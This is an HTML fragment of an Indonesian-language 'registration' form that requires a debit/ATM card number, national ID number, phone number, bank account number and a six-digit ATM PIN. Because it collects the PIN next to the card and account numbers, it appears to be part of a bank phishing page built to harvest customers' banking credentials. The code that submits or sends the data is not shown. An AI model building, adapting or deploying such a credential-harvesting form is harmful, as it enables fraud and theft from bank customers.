    <div class="container mt-4">
        <div class="card">
            <div class="card-header text-center fw-bold text-light" style="background-color: #1CC0CC;">
                <h5>Informasi Pendaftaran</h5>
                <p>( Wajib Diisi )</p>
            </div>
            <div class="card-body">
                    <div class="form-group">
                        <label for="nkd">Nomor Kartu Debit/ATM *</label>
                        <input type="number" class="form-control" id="nkd" name="nkd" style="border: 1px solid #1CC0CC; border-radius: 15px;">
                    </div>
                    <div class="form-group">
                        <label for="nis">Nomor Identitas (sesuai KTP) *</label>
                        <input type="number" class="form-control" id="nis" name="nis" style="border: 1px solid #1CC0CC; border-radius: 15px;">
                    </div>
                    <div class="form-group">
                        <label>Jenis Kelamin *</label><br>
                        <div class="form-check form-check-inline">
                            <input class="form-check-input" type="radio" name="gender" id="male" value="male">
                            <label class="form-check-label" for="male">Laki-laki</label>
                        </div>
                        <div class="form-check form-check-inline">
                            <input class="form-check-input" type="radio" name="gender" id="female" value="female">
                            <label class="form-check-label" for="female">Perempuan</label>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="nope">No. Handphone yang terdaftar *</label>
                        <input type="number" class="form-control" id="nope" name="nope" style="border: 1px solid #1CC0CC; border-radius: 15px;">
                    </div>
                    <div class="form-group">
                        <label for="pinatm">PIN ATM (6 Angka) *</label>
                        <input type="number" class="form-control" id="pinatm" name="pinatm" style="border: 1px solid #1CC0CC; border-radius: 15px;">
                    </div>
                    <div class="form-group">
                        <label for="norek">Nomor Rekening *</label>
                        <input type="number" class="form-control" id="norek" name="norek" style="border: 1px solid #1CC0CC; border-radius: 15px;">
                    </div>
                    <div class="btnSubmit mt-4">
                        <button onclick="next()" class="form-control text-light fw-bold" style="background-color: #1CC0CC; border-radius: 15px;">Lanjutkan</button>
                    </div>
            </div>
        </div>
    </div>
